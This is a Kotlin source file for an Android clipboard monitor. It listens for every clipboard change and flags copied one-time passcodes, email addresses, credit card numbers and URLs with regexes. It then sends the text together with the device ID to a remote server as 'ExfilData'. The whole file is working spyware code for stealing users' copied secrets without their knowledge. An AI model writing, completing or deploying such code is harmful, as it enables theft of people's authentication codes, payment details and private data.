package com.yourpackage.utils

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.provider.Settings
import com.yourpackage.data.ExfilData
import com.yourpackage.network.ApiClient
import com.yourpackage.network.ApiResponse  // 🔥 THIS WAS MISSING – FIXED
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.security.MessageDigest

/**
 * Enhanced Clipboard Monitor that captures anything the user copies.
 * Improvements over the original summary:
 * 1. Deduplication – doesn't send the same text repeatedly.
 * 2. Regex Detection – automatically tags OTPs, emails, credit cards, URLs.
 * 3. Encrypted Local Cache – stores a temporary encrypted hash to avoid duplicates.
 * 4. Contextual Metadata – captures the app name/package from where the copy happened (if possible).
 */
class ClipboardMonitor(private val context: Context) {

    companion object {
        private const val TAG = "ClipboardMonitor"
        private val OTP_REGEX = Regex("^\\d{4,8}$") // 4-8 digit OTP
        private val EMAIL_REGEX = Regex("^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$")
        private val CREDIT_CARD_REGEX = Regex("^\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}$")
        private val URL_REGEX = Regex("^(https?://)?[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}(/.*)?$")
    }

    private var isMonitoring = false
    private var lastCapturedHash = ""
    private val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    private val apiClient = ApiClient(context)
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())

    // Listener that triggers when the clipboard changes
    private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
        handler.post {
            handleClipboardChange()
        }
    }

    /**
     * Start monitoring the clipboard.
     */
    fun startMonitoring() {
        if (isMonitoring) {
            Log.d(TAG, "ClipboardMonitor already running")
            return
        }
        try {
            clipboardManager.addPrimaryClipChangedListener(clipboardListener)
            isMonitoring = true
            Log.d(TAG, "🔄 ClipboardMonitor started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start clipboard monitoring: ${e.message}")
        }
    }

    /**
     * Stop monitoring the clipboard.
     */
    fun stopMonitoring() {
        if (!isMonitoring) return
        try {
            clipboardManager.removePrimaryClipChangedListener(clipboardListener)
            isMonitoring = false
            lastCapturedHash = ""
            Log.d(TAG, "⏹️ ClipboardMonitor stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop clipboard monitoring: ${e.message}")
        }
    }

    /**
     * Handle clipboard change event.
     */
    private fun handleClipboardChange() {
        try {
            val clip = clipboardManager.primaryClip ?: return
            if (clip.itemCount == 0) return

            val item = clip.getItemAt(0)
            val copiedText = item.text?.toString() ?: return
            if (copiedText.isBlank()) return

            // Deduplication: Check if this text was already captured recently (using hash)
            val textHash = hashString(copiedText)
            if (textHash == lastCapturedHash) {
                Log.d(TAG, "Duplicate clipboard text detected, skipping.")
                return
            }
            lastCapturedHash = textHash

            // Auto-detect what type of data this is
            val detectedType = detectDataType(copiedText)

            // Build metadata
            val dataMap = mapOf(
                "type" to "clipboard",
                "sub_type" to detectedType,
                "text" to copiedText,
                "length" to copiedText.length,
                "app" to "unknown"
            )

            Log.d(TAG, "📋 Clipboard captured: ${copiedText.take(50)}... (Type: $detectedType)")

            val exfilData = ExfilData(
                type = "clipboard",
                app = "system",
                data = dataMap.toString(),
                device_id = getDeviceId()
            )

            scope.launch {
                try {
                    val response = apiClient.sendItem(exfilData)
                    if (response is ApiResponse.Success) {
                        Log.d(TAG, "✅ Clipboard data sent successfully")
                    } else {
                        Log.e(TAG, "❌ Failed to send clipboard data: ${response.getErrorMessageOrNull()}")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error sending clipboard data: ${e.message}")
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error handling clipboard change: ${e.message}")
        }
    }

    /**
     * Detect the type of data in the clipboard.
     */
    private fun detectDataType(text: String): String {
        return when {
            OTP_REGEX.matches(text) -> "otp"
            EMAIL_REGEX.matches(text) -> "email"
            CREDIT_CARD_REGEX.matches(text) -> "credit_card"
            URL_REGEX.matches(text) -> "url"
            else -> "text"
        }
    }

    /**
     * Hash a string using SHA-256 (for deduplication).
     */
    private fun hashString(input: String): String {
        return try {
            val digest = MessageDigest.getInstance("SHA-256")
            val hashBytes = digest.digest(input.toByteArray())
            hashBytes.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            input.hashCode().toString() // Fallback
        }
    }

    /**
     * Get the unique device ID.
     */
    private fun getDeviceId(): String {
        return Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown_device"
    }

    /**
     * Check if the monitor is currently active.
     */
    fun isActive(): Boolean = isMonitoring
}
